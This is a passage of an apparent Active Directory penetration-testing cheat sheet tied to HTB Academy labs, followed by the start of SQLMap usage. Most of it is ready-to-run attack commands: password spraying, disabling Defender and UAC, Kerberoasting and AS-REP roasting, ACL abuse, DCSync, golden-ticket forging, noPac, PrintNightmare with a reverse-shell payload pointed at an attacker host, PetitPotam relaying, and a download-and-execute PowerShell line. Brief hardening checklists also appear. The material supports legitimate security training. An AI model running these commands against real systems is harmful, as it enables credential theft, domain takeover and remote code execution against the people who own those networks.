# Using Rpcclient a Bash one-liner for the Attack.
for u in $(cat valid_users.txt);do rpcclient -U "$u%<PASSWORD>" -c "getusername;quit" 172.16.5.5 | grep Authority; done

# Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt <PASSWORD>

# Using CrackMapExec & Filtering Logon Failures
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p <PASSWORD> | grep +
sudo crackmapexec smb 172.16.5.5 -u avazquez -p <PASSWORD>

# Uses CrackMapExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep.
sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H <NTLM_HASH> | grep +

# Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password <PASSWORD> -OutFile spray_success -ErrorAction SilentlyContinue
```

### Enabling & Bypassing Security Controls

```
whoami
whoami /groups

# Checking the Status of Defender with Get-MpComputerStatus
Get-MpComputerStatus

# Check if Defender is enabled
Get-MpComputerStatus | Select AntivirusEnabled

# Check if defensive modules are enabled
Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled | FL

# Check if tamper protection is enabled
Get-MpComputerStatus | Select IsTamperProtected, RealTimeProtectionEnabled | FL

# Check for alternative AV products
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
# Check whether this computer is part of a domain
(Get-CimInstance Win32_ComputerSystem).PartOfDomain
# Get the domain this computer belongs to
(Get-CimInstance Win32_ComputerSystem).Domain

# Disabling UAC
cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"

# Disables realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disables scanning for downloaded files or attachments
Set-MpPreference -DisableIOAVProtection $true

# Disable behavior monitoring
Set-MpPreference -DisableBehaviorMonitoring $true

# Make exclusion for a certain folder
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Disables cloud detection
Set-MpPreference -DisableBlockAtFirstSeen $true

# Disables scanning of .pst and other email formats
Set-MpPreference -DisableEmailScanning $true

# Disables script scanning during malware scans
Set-MpPreference -DisableScriptScanning $true

# Exclude files by extension
Set-MpPreference -ExclusionExtension "ps1"

# Turn off everything and set exclusion to "C:\Windows\Temp"
Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableBehaviorMonitoring $true;Set-MpPreference -DisableBlockAtFirstSeen $true;Set-MpPreference -DisableEmailScanning $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Bypassing with path exclusion
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# PowerShell cmdlet used to view AppLocker policies from a Windows-based host.
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Checking PowerShell Constrained Language Mode
$ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

# Checking LAPS
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```

### Credentialed Enumeration

#### From Linux

```bash
# Domain groups
sudo crackmapexec smb 172.16.5.5 -u forend -p '<PASSWORD>' --groups

# Logged-on users and shares
sudo crackmapexec smb 172.16.5.130 -u forend -p '<PASSWORD>' --loggedon-users
sudo crackmapexec smb 172.16.5.5 -u forend -p '<PASSWORD>' --shares
sudo crackmapexec smb 172.16.5.5 -u forend -p '<PASSWORD>' -M spider_plus --share 'Department Shares'
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json

# smbmap
smbmap -u forend -p '<PASSWORD>' -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p '<PASSWORD>' -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

# rpcclient
rpcclient -U "" -N 172.16.5.5
queryuser 0x457
enumdomusers

# Impacket
psexec.py inlanefreight.local/wley:'<PASSWORD>'@172.16.5.125
wmiexec.py inlanefreight.local/wley:'<PASSWORD>'@172.16.5.5

# windapsearch
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p '<PASSWORD>' --da
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p '<PASSWORD>' -PU

# bloodhound-python
sudo bloodhound-python -u 'forend' -p '<PASSWORD>' -ns 172.16.5.5 -d inlanefreight.local -c all
```

References: [BloodHound](https://academy.hackthebox.com/course/preview/active-directory-bloodhound), [WADComs](https://wadcoms.github.io/)

#### From Windows

```powershell
Import-Module ActiveDirectory
Get-Module
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"
```

PowerView:

```powershell
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainTrustMapping
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

SharpView:

```powershell
.\SharpView.exe Get-DomainUser -Help
.\SharpView.exe Get-DomainUser -Identity forend
```

Snaffler:

```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
```

SharpHound:

```powershell
.\SharpHound.exe --help
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

### Living off the Land (Windows)

Basic host and domain enumeration using only built-in Windows binaries.

#### Basic Host Enumeration

```cmd
hostname
[System.Environment]::OSVersion.Version
wmic qfe get Caption,Description,HotFixID,InstalledOn
ipconfig /all
set
echo %USERDOMAIN%
echo %logonserver%
```

#### PowerShell Enumeration

```powershell
Get-Module
Get-ExecutionPolicy -List
Set-ExecutionPolicy Bypass -Scope Process
Get-ChildItem Env: | ft Key,Value
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-Host

# Download and execute in memory
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/script.ps1'); <follow-on commands>"
```

#### Firewall & Defender Checks

```cmd
netsh advfirewall show allprofiles
sc query windefend
```

```powershell
Get-MpComputerStatus
```

#### Logged-on Users

```cmd
qwinsta
```

#### Network Information

```cmd
arp -a
ipconfig /all
route print
netsh advfirewall show allprofiles
```

#### WMI Enumeration

```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

Reference: <https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4>

#### Net Commands

| Command | Description |
|---|---|
| `net accounts` | Password requirements |
| `net accounts /domain` | Password and lockout policy |
| `net group /domain` | Domain groups |
| `net group "Domain Admins" /domain` | Users with Domain Admin privileges |
| `net group "Domain Computers" /domain` | Computers joined to the domain |
| `net group "Domain Controllers" /domain` | Domain controller accounts |
| `net group <group> /domain` | Members of a domain group |
| `net localgroup` | All available local groups |
| `net localgroup Administrators` | Members of the local Administrators group |
| `net localgroup administrators <user> /add` | Add a user to the local Administrators group |
| `net share` | Current shares |
| `net user <account> /domain` | Information about a domain user |
| `net user /domain` | All domain users |
| `net user %username%` | Information about the current user |
| `net use x: \\computer\share` | Mount a share locally |
| `net view` | List computers |
| `net view /all /domain[:domain]` | Shares in the domain |
| `net view \\computer /ALL` | Shares on a computer |
| `net view /domain` | Computers in the domain |

> If `net` is blocked or monitored, try `net1` instead.

#### Dsquery

```cmd
dsquery user
dsquery computer
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

Reference: <https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)>

### Kerberoasting

```
# Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
	impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs

# Enumerating SPNs with setspn.exe
setspn.exe -Q */*

# PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Retrieving All Tickets Using setspn.exe
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# Mimikatz command that ensures TGS tickets are extracted in base64 format from a Windows-based host.
mimikatz # base64 /out:true

# Mimikatz command used to extract the TGS tickets from a Windows-based host.
kerberos::list /export

# Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.
echo "<base64 blob>" | tr -d \\n

# Used to output a file (encoded_file) into a .kirbi file in base64 (base64 -d > sqldev.kirbi) format from a Linux-based host.
cat encoded_file | base64 -d > sqldev.kirbi

# Used to extract the Kerberos ticket. This also creates a file called crack_file from a Linux-based host.
python2.7 kirbi2john.py sqldev.kirbi

# Used to modify the crack_file for Hashcat from a Linux-based host.
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Uses PowerView tool to extract TGS Tickets . Performed from a Windows-based host.
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname

# PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host.
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes --> checking support encryption types.

# Used to request/download a TGS ticket for a specific user (/user:testspn) the formats the output in an easy to view & crack manner (/nowrap). Performed from a Windows-based host.
.\Rubeus.exe kerberoast /user:testspn /nowrap
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Cracking Kerberos ticket hash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force

```

### ACL Enumeration & Abuse

```
# PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.
Find-InterestingDomainAcl

# Used to import PowerView and retrieve the SID of a specific user account (wley) from a Windows-based host.
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley

# Using Get-DomainObjectACL
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
# Performing a Reverse Search & Mapping to a GUID Value
$guid= "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
# Using the -ResolveGUIDs Flag
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
# Creating a List of Domain Users
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
# Loop over each user
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
# Further Enumeration of Rights Using damundsen
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
Get-DomainObjectACL -Identity "GPO Management GroupMembers" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
# Investigating the Help Desk Level 1 Group with Get-DomainGroup
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
# Investigating the Information Technology Group
$itgroupsid = Convert-NameToSid "Information Technology"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
# Looking for Interesting Access
$adunnsid = Convert-NameToSid adunn
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

# Used to create a PSCredential Object from a Windows-based host.
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Creating a SecureString Object
$damundsenPassword = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force

# PowerView tool used to change the password of a specific user (damundsen) on a target Windows domain from a Windows-based host.
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

$SecPassword = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

# PowerView tool used to add a specific user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host.
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

# PowerView tool used to view the members of a specific security group (Help Desk Level 1) and output only the username of each member (Select MemberName) of the group from a Windows-based host.
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# PowerView tool used to create a fake Service Principal Name given a specific user (adunn) from a Windows-based host.
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
# Kerberoasting with Rubeus
.\Rubeus.exe kerberoast /user:adunn /nowrap

# remove and clean up
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

### DCSync

```
# PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host.
Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl

# Uses Mimikatz to perform a dcsync attack from a Windows-based host.
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator

# Uses the PowerShell cmdlet Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password).
Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred

```

### Miscellaneous Misconfigurations

```
# SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host.
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# PowerView tool used to display the description field of select objects (Select-Object) on a target Windows domain from a Windows-based host.
Get-DomainUser * | Select-Object samaccountname,description

# PowerView tool used to check for the PASSWD_NOTREQD setting of select objects (Select-Object) on a target Windows domain from a Windows-based host.
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### AS-REP Roasting

```
# PowerView based tool used to search for the DONT_REQ_PREAUTH value across user accounts in a target Windows domain. Performed from a Windows-based host.
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Uses Rubeus to perform an AS-REP Roasting attack and formats the output for Hashcat. Performed from a Windows-based host.
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

# Uses Hashcat to attempt to crack the captured hash using a wordlist (rockyou.txt). Performed from a Linux-based host.
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt

# Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

### Child → Parent Trusts (ExtraSids)

#### Enumeration

```powershell
Import-Module ActiveDirectory
Get-ADTrust -Filter *
Get-DomainTrust
Get-DomainTrustMapping
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```

```cmd
netdom query /domain:inlanefreight.local trust
netdom query /domain:inlanefreight.local dc
netdom query /domain:inlanefreight.local workstation
```

#### ExtraSids — Mimikatz

Requirements:

- KRBTGT hash of the child domain
- SID of the child domain
- Name of a target user in the child domain (the account does not need to exist)
- FQDN of the child domain
- SID of the root domain's Enterprise Admins group

```powershell
# KRBTGT hash
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

# Child domain SID
Get-DomainSID

# Enterprise Admins SID
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

# Confirm no access
ls \\academy-ea-dc01.inlanefreight.local\c$

# Golden ticket
mimikatz.exe
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<CHILD_DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<ENTERPRISE_ADMINS_SID> /ptt
klist
ls \\academy-ea-dc01.inlanefreight.local\c$
```

#### ExtraSids — Rubeus

```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<CHILD_DOMAIN_SID> /sids:<ENTERPRISE_ADMINS_SID> /user:hacker /ptt
klist
```

#### DCSync from the Child Domain

```powershell
.\mimikatz.exe
lsadump::dcsync /user:INLANEFREIGHT\lab_adm
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

#### From Linux (Impacket)

```bash
# KRBTGT hash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

# Domain SID
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

# Golden ticket
ticketer.py -nthash <KRBTGT_HASH> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <CHILD_DOMAIN_SID> -extra-sid <ENTERPRISE_ADMINS_SID> hacker
export KRB5CCNAME=hacker.ccache

# SYSTEM shell
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

# Automated
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

### Cross-Forest Trusts

#### From Windows

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof

# Kerberoast across the trust
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

# Foreign group membership
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
Convert-SidToName <ROOT_DOMAIN_ADMIN_SID>

# Remote session
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

#### From Linux

```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

Point DNS at the target domain before enumerating:

```bash
# Add INLANEFREIGHT.LOCAL to /etc/resolv.conf
cat /etc/resolv.conf
#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5

bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p '<PASSWORD>'
zip -r ilfreight_bh.zip *.json

# Add FREIGHTLOGISTICS.LOCAL to /etc/resolv.conf
cat /etc/resolv.conf
#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238

bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p '<PASSWORD>'
```

### AD Tooling, External Recon & Advanced Attacks

Tooling:

- **BloodHound/SharpHound** — graph relationships, ACLs, sessions.
- **PowerView** — domain enumeration and ACL abuse.
- **Rubeus** — Kerberos tickets, Kerberoasting, AS-REP, PtT.
- **Impacket** — `GetUserSPNs.py`, `secretsdump.py`, `psexec.py`, `wmiexec.py`, `ticketer.py`.
- **Windapsearch / ldapsearch** — LDAP enumeration.
- **Snaffler** — find credentials and sensitive files on shares.
- **AD Explorer / ADSI Edit** — GUI inspection.

External recon:

```bash
dig any <DOMAIN>
dig axfr <DOMAIN> @<NAMESERVER>
nmap -sV -sC -p 53,80,443,389,636,88,445,3389 <TARGET>
ldapsearch -H ldap://<TARGET> -x -s base -b "" namingContexts
```

Look for exposed VPN, OWA, AD FS, and LDAP services. Enumerate usernames via DNS, email formats, and public data before spraying.

Privileged access and the Kerberos double-hop problem:

```powershell
Enter-PSSession -ComputerName <HOST> -Credential $cred
Invoke-Command -ComputerName <HOST> -Credential $cred -ScriptBlock { whoami }
klist
```

- The double-hop problem occurs when a second network hop cannot reuse the user's credentials.
- Options: CredSSP, constrained delegation, `PSSessionConfiguration`, or Kerberos delegation.
- Check unconstrained delegation and `TrustedForDelegation` accounts.

Bleeding-edge vulnerabilities to check:

- **Zerologon** (CVE-2020-1472) — Netlogon cryptographic bypass.
- **PrintNightmare** (CVE-2021-1675 / CVE-2021-34527) — print spooler RCE/LPE.
- **PetitPotam** — coercion to relay NTLM to AD CS or SMB.
- **noPac** (CVE-2021-42278 / CVE-2021-42287) — sAMAccountName spoofing to Domain Admin.
- **AD CS ESC1-ESC8** — certificate template abuse.

Check patch levels and only run a PoC that matches the target. These attacks can be disruptive.

AD hardening and auditing:

- Tiered administration; separate DA, server, and workstation admins.
- LAPS for local admin passwords; disable inactive accounts.
- Disable LLMNR/NBT-NS and mDNS where possible.
- Restrict Kerberos delegation and unconstrained delegation.
- Enforce LDAP signing/channel binding; protect AD CS templates.
- Patch DCs and monitor replication, DCSync, and privilege changes.
- Audit ACLs, SPNs, password policy, and privileged group membership.

#### Domain & External Enumeration Commands

```bash
# DNS and public exposure
nslookup ns1.<DOMAIN>
dig any <DOMAIN>

# Breach/OSINT lookup (authorized engagements only)
sudo python3 dehashed.py -q <DOMAIN> -p

# Kerbrute build and username enumeration
sudo git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
make help
sudo make all
ls dist/
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt -o valid_ad_users
```

#### Privileged Access & Lateral Movement

```powershell
# Who can log on where
Get-NetLocalGroupMember -ComputerName <HOST> -GroupName "Remote Desktop Users"
Get-NetLocalGroupMember -ComputerName <HOST> -GroupName "Remote Management Users"

# PSSession with explicit credentials
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USER>", $password)
Enter-PSSession -ComputerName <HOST> -Credential $cred
```

```bash
# WinRM
gem install evil-winrm
evil-winrm -i <TARGET> -u <USER> -p '<PASSWORD>'
```

```powershell
# MSSQL discovery and querying
cd .\PowerUpSQL\
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "<SQL_HOST>,1433" -username "<DOMAIN>\<USER>" -password "<PASSWORD>" -query 'Select @@version'
```

```bash
mssqlclient.py <DOMAIN>/<USER>@<SQL_HOST> -windows-auth
```

#### Kerberos Double Hop

The double-hop problem occurs when a PowerShell remoting session cannot reuse the user's credentials for a second network hop.

```powershell
Enter-PSSession -ComputerName <HOST> -Credential <DOMAIN>\<USER>
klist

# Workaround: register a session configuration that runs as the target user
Register-PSSessionConfiguration -Name <CONFIG> -RunAsCredential <DOMAIN>\<USER>
Enter-PSSession -ComputerName <HOST> -Credential <DOMAIN>\<USER> -ConfigurationName <CONFIG>
```

Other approaches: CredSSP, constrained delegation, or Kerberos delegation. Check for unconstrained delegation and `TrustedForDelegation` accounts.

#### Bleeding-Edge AD Vulnerabilities

**noPac (CVE-2021-42278 / CVE-2021-42287)** — sAMAccountName spoofing:

```bash
git clone https://github.com/Ridter/noPac.git
sudo python3 scanner.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -use-ldap
sudo python3 noPac.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> \
  -dc-host <DC_HOST> -shell --impersonate administrator -use-ldap
sudo python3 noPac.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> \
  -dc-host <DC_HOST> --impersonate administrator -use-ldap \
  -dump -just-dc-user <DOMAIN>/administrator
```

**PrintNightmare (CVE-2021-1675 / CVE-2021-34527)** — print spooler:

```bash
rpcdump.py @<DC_IP> | egrep 'MS-RPRN|MS-PAR'
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=8080 -f dll > payload.dll
sudo smbserver.py -smb2support CompData /path/to/payload.dll
sudo python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> '\\<ATTACKER_IP>\CompData\payload.dll'
```

**PetitPotam + AD CS (ESC8)** — coerce a DC to authenticate to a relay:

```bash
sudo ntlmrelayx.py -debug -smb2support \
  --target http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>

# Use the issued certificate to obtain a TGT
python3 /opt/PKINITtools/gettgtpkinit.py <DOMAIN>/<DC_HOST>$ \
  -pfx-base64 <PFX_BASE64> dc01.ccache
export KRB5CCNAME=dc01.ccache
secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass \
  "<DC_HOST>$"@<DC_FQDN>
```

**Zerologon (CVE-2020-1472)** — only on unpatched DCs; check the patch level first. These attacks can be disruptive and are often detected.

#### ADIDNS, GPP & GPO Enumeration

```bash
# AD-integrated DNS records
adidnsdump -u '<DOMAIN>\<USER>' ldap://<DC_IP>
head records.csv
adidnsdump -u '<DOMAIN>\<USER>' ldap://<DC_IP> -r
```

```powershell
# SYSVOL scripts and Group Policy Preferences
ls \\<DC>\SYSVOL\<DOMAIN>\scripts
cat \\<DC>\SYSVOL\<DOMAIN>\scripts\<FILE>

Get-DomainGPO | select displayname
Get-GPO -All | Select DisplayName
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $sid}
```

```bash
# GPP cpassword decryption and autologin discovery
gpp-decrypt <GPP_STRING>
crackmapexec smb <DC_IP> -u <USER> -p '<PASSWORD>' -M gpp_autologin
```

#### AD Auditing & Hardening

```powershell
# Protected Users and reversible-password accounts
Get-ADGroup -Identity "Protected Users" -Properties Name,Description,Members
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |
  select samaccountname,useraccountcontrol
```

```powershell
# Auditing tools
PingCastle.exe --help
group3r.exe -f <filepath-name.log>
.\ADRecon.ps1
```

Hardening checklist:

- Tiered administration; separate Domain Admin, Server Admin, and Workstation Admin roles.
- LAPS for local administrator passwords; remove inactive accounts.
- Disable LLMNR/NBT-NS and mDNS where possible.
- Restrict Kerberos delegation; remove unconstrained delegation.
- Enforce LDAP signing/channel binding; protect AD CS templates.
- Patch DCs and monitor replication, DCSync, and privilege changes.
- Audit ACLs, SPNs, password policy, and privileged group membership.
- Use Protected Users for high-value accounts and disable reversible password storage.

> The AD skills-assessment sections are intentionally not summarized. Complete them in the HTB Academy lab.

## 11. SQLMap

```
# Run SQLMap without asking for user input
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

# SQLMap with POST request specifying an injection point with asterisk
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'

# Passing an HTTP request file to SQLMap
sqlmap -r req.txt

# Specifying a PUT request
sqlmap -u www.target.com --data='id=1' --method PUT

# Specifying a prefix or suffix
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

